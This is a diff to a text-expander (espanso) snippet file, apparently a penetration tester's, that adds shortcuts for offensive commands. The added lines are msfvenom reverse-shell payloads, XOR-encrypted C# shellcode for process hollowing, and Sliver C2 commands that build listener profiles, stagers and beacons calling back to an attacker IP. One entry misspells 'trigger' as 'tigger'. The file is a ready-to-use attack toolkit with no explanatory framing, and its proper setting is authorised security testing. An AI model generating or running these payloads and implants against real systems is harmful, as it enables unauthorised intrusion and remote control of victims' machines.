@@ -31,7 +31,7 @@ matches:
   - trigger: ":clipboard"
     replace: "{{clipboard}}"
                   
-# SETUP AND NMAP              
+# SETUP              
   - trigger: ":setup"                  
     replace : |          
       mkdir -p net && cd net         
@@ -69,7 +69,12 @@ matches:
 
   - trigger: ":msfmlin"
     replace: msfvenom -p linux/x64/meterpreter_reverse_tcp LPORT=443 -f elf -o shell.elf LHOST=
+  
+  - trigger: ":msfsliver"
+    replace: msfvenom -a x64 -p windows/x64/custom/reverse_winhttp LHOST=tun0 LPORT=8443 LURI=/payload.woff -f exe -o sliverstage.exe EXITFUNC=thread
 
+  - trigger: ":msfhollow"
+    replace: msfvenom -p windows/x64/custom/reverse_winhttp LHOST=tun0 LPORT=8443 EXITFUNC=thread LURI=/payload.woff -f csharp --encrypt xor --encrypt-key z -i 20 | tr -d '\n\r'
   - trigger: ":smb"
     replace: "impacket-smbserver -smb2support share ."
 
@@ -84,7 +89,28 @@ matches:
                                                                                 
   - trigger: ":nc"
     replace: nc -nvlp 443
+    
+  - trigger: ":sliver64profile"
+    replace: profiles new --mtls {{IP}}:443 --format shellcode win-shellcode -o 
+  
+  - trigger: ":sliver32profile"
+    replace: profiles new -a 386 --mtls {{IP}}:443 --format shellcode win-shellcodex86 -o 
 
+  - trigger: ":sliverstage"
+    replace: stage-listener --url http://ip:8443 --prepend-size --profile win-shellcode
+
+  - trigger: ":sliverdllgens"
+    replace: generate -e -f shared -m {{IP}}:443 -R
+
+  - tigger: ":sliverexegens"
+    replace: generate  -e -f exe -m {{IP}}:443
+
+  - trigger: ":sliverdllgenb"
+    replace: generate beacon -e -f shared -S 23 -J 13 -R -m {{IP}}:443
+    
+  - trigger: ":sliverexegenb"
+    replace: generate beacon -e -f exe -S 23 -J 13 -m {{IP}}:443  
+    
 # ENUMERATION
   - trigger: ":nmap"
     replace: sudo nmap -sC -sV -v -p- -o nmap {{clipboard}} --min-rate 
